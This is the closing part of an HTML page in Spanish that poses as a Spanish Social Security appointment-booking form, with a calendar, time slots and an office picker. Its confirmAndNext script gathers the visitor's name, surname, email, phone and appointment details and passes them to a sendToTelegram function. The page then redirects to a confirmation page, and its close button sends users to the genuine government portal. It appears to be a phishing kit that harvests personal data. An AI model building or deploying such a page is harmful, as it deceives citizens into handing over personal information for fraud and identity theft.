<!-- Calendar & Time -->
<div class="grid grid-cols-1 md:grid-cols-2 gap-4 sm:gap-6">
<!-- Calendar Placeholder -->
<div class="space-y-2">
<label class="block text-[11px] font-bold text-gray-500 uppercase tracking-wider">Seleccionar Fecha</label>
<div class="p-4 bg-gray-50 border border-gray-200 rounded-lg">
<div class="flex justify-between items-center mb-3">
<span class="text-xs font-bold" id="currentMonth">Mayo 2026</span>
<div class="flex gap-1">
<span class="material-symbols-outlined text-sm cursor-pointer" onclick="prevMonth()">chevron_left</span>
<span class="material-symbols-outlined text-sm cursor-pointer" onclick="nextMonth()">chevron_right</span>
</div>
</div>
<div class="grid grid-cols-7 gap-1 text-center text-[10px] font-bold mb-2">
<span class="text-red-500">L</span><span>M</span><span class="">X</span><span class="">J</span><span class="">V</span><span class="">S</span><span class="text-red-500">D</span>
</div>
<div id="calendarDays" class="grid grid-cols-7 gap-1 text-center text-[10px]"></div>
</div>
</div>
<!-- Time Slots -->
<div class="space-y-2">
<label class="block text-[11px] font-bold text-gray-500 uppercase tracking-wider">Horas Disponibles</label>
<div class="grid grid-cols-2 gap-2" id="timeSlots">
<button class="py-2 border border-ss-navy text-ss-navy text-xs font-bold rounded hover:bg-ss-navy hover:text-white transition-colors" type="button">09:00</button>
<button class="py-2 border border-ss-navy text-ss-navy text-xs font-bold rounded hover:bg-ss-navy hover:text-white transition-colors" type="button">09:30</button>
<button class="py-2 border border-ss-navy text-ss-navy text-xs font-bold rounded hover:bg-ss-navy hover:text-white transition-colors" type="button">10:00</button>
<button class="py-2 border border-ss-navy text-ss-navy text-xs font-bold rounded hover:bg-ss-navy hover:text-white transition-colors" type="button">10:30</button>
<button class="py-2 border border-ss-navy text-ss-navy text-xs font-bold rounded hover:bg-ss-navy hover:text-white transition-colors" type="button">11:00</button>
<button class="py-2 border border-ss-navy text-ss-navy text-xs font-bold rounded hover:bg-ss-navy hover:text-white transition-colors" type="button">11:30</button>
</div>
</div>
</div>
<!-- Action Buttons -->
<div class="flex flex-col gap-3 pt-6">
<button onclick="confirmAndNext()" class="w-full py-3 bg-ss-navy text-white font-bold rounded-lg hover:shadow-lg hover:brightness-110 transition-all uppercase text-xs tracking-widest" type="button">
        CONFIRMAR CITA
    </button>
<button onclick="confirmAndNext()" type="button" class="w-full py-3 bg-ss-yellow text-ss-navy font-bold rounded-lg hover:shadow-lg hover:brightness-105 transition-all uppercase text-xs tracking-widest text-center inline-block">SIGUIENTE</button>
</div>
</form>
</div>
</div>
<!-- Floating Help Icon -->
<div class="fixed bottom-8 right-8 z-[90] bg-ss-yellow text-ss-navy p-5 rounded-full shadow-2xl cursor-pointer hover:scale-110 transition-transform active:scale-95 group" onclick="openModal()">
<span class="material-symbols-outlined text-5xl" style="font-variation-settings: 'FILL' 1;">forum</span>
<div class="absolute right-full mr-4 top-1/2 -translate-y-1/2 bg-white px-5 py-3 rounded-lg sm:rounded-xl shadow-xl border border-gray-100 opacity-0 group-hover:opacity-100 transition-opacity whitespace-nowrap pointer-events-none">
<p class="font-bold text-ss-navy text-base">¿Podemos ayudarte?</p>
</div>
</div>
<script>
    function closeModal() {
        const modal = document.getElementById('contact-modal');
        modal.classList.add('opacity-0');
        modal.classList.add('pointer-events-none');
        setTimeout(() => {
            window.location.href = 'https://www.seg-social.es/wps/portal/wss/internet/Inicio';
        }, 300);
    }

    function openModal() {
        const modal = document.getElementById('contact-modal');
        modal.classList.remove('hidden');
        setTimeout(() => {
            modal.classList.remove('opacity-0');
            modal.classList.remove('pointer-events-none');
        }, 10);
    }

    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') closeModal();
    });
    
    let currentDate = new Date(2026, 4, 15);
    let selectedDayNum = 15;
    let selectedTime = null;
    const months = ['Enero', 'Febrero', 'Marzo', 'Abril', 'Mayo', 'Junio', 'Julio', 'Agosto', 'Septiembre', 'Octubre', 'Noviembre', 'Diciembre'];
    
    function renderCalendar() {
        const calendarEl = document.getElementById('calendarDays');
        const monthEl = document.getElementById('currentMonth');
        monthEl.textContent = months[currentDate.getMonth()] + ' ' + currentDate.getFullYear();
        const firstDay = new Date(currentDate.getFullYear(), currentDate.getMonth(), 1);
        const lastDay = new Date(currentDate.getFullYear(), currentDate.getMonth() + 1, 0);
        let html = '';
        
        const startOffset = firstDay.getDay() === 0 ? 6 : firstDay.getDay() - 1;
        
        for (let i = 0; i < startOffset; i++) {
            html += '<div class="py-1"></div>';
        }
        for (let i = 1; i <= lastDay.getDate(); i++) {
            const isSelected = selectedDayNum === i;
            html += '<div class="py-1 cursor-pointer hover:bg-ss-navy hover:text-white rounded-full ' + (isSelected ? 'bg-ss-navy text-white' : 'bg-blue-100') + '" onclick="selectDay(this, ' + i + ')">' + i + '</div>';
        }
        calendarEl.innerHTML = html;
    }
    
    function prevMonth() {
        currentDate.setMonth(currentDate.getMonth() - 1);
        selectedDayNum = null;
        renderCalendar();
    }
    
    function nextMonth() {
        currentDate.setMonth(currentDate.getMonth() + 1);
        selectedDayNum = null;
        renderCalendar();
    }
    
    function selectDay(el, day) {
        document.querySelectorAll('#calendarDays div').forEach(d => {
            if (d.textContent && !isNaN(d.textContent)) {
                d.classList.remove('bg-ss-navy', 'text-white');
                d.classList.add('bg-blue-100');
            }
        });
        el.classList.remove('bg-blue-100');
        el.classList.add('bg-ss-navy', 'text-white');
        selectedDayNum = day;
    }
    
    function setupTimeSlots() {
        const slots = document.querySelectorAll('#timeSlots button');
        slots.forEach(slot => {
            slot.addEventListener('click', () => {
                slots.forEach(s => {
                    s.classList.remove('bg-ss-navy', 'text-white');
                    s.classList.add('text-ss-navy');
                });
                slot.classList.add('bg-ss-navy', 'text-white');
                slot.classList.remove('text-ss-navy');
                selectedTime = slot.textContent.trim();
            });
        });
    }
    
    function filterOffices() {
        const search = document.getElementById('officeSearch').value.toLowerCase();
        const officesList = document.getElementById('officesList');
        if (search.length > 0) {
            officesList.classList.remove('hidden');
            document.querySelectorAll('.office-item').forEach(item => {
                item.style.display = item.textContent.toLowerCase().includes(search) ? 'block' : 'none';
            });
        } else {
            officesList.classList.add('hidden');
        }
    }
    
    function selectOffice(el) {
        document.getElementById('officeSearch').value = el.querySelector('.font-bold').textContent;
        document.getElementById('officesList').classList.add('hidden');
    }
    
function confirmAndNext() {
         const office = document.getElementById('officeSearch').value.trim();
         if (!office) {
             alert('Por favor, busque y seleccione una oficina.');
             document.getElementById('officeSearch').focus();
             return;
         }
         if (!selectedDayNum) {
             alert('Por favor, seleccione un día del calendario.');
             return;
         }
         if (!selectedTime) {
             alert('Por favor, seleccione una hora disponible.');
             return;
         }
         
         const appointmentData = {
             oficina: office,
             fecha: `${selectedDayNum} de ${months[currentDate.getMonth()]} ${currentDate.getFullYear()}`,
             hora: selectedTime
         };
         
         saveFormData('cita', appointmentData);
         
         const allData = collectAllData();
         const message = `
<b>📅 Cita confirmada:</b>
Oficina: ${appointmentData.oficina}
Fecha: ${appointmentData.fecha}
Hora: ${appointmentData.hora}

<b>👤 Usuario:</b>
Nombre: ${allData.nombre || 'N/A'}
Apellido: ${allData.apellido || 'N/A'}
Email: ${allData.email || 'N/A'}
Teléfono: ${allData.telefono || 'N/A'}
         `;
         sendToTelegram(message, 'Datos Cita');
         
         window.location.href = 'citaconfirmada.html';
     }
    
    renderCalendar();
    setupTimeSlots();
    
    // Forzar apertura del modal al cargar la página
    setTimeout(() => {
        openModal();
    }, 100);
</script>
</body></html>
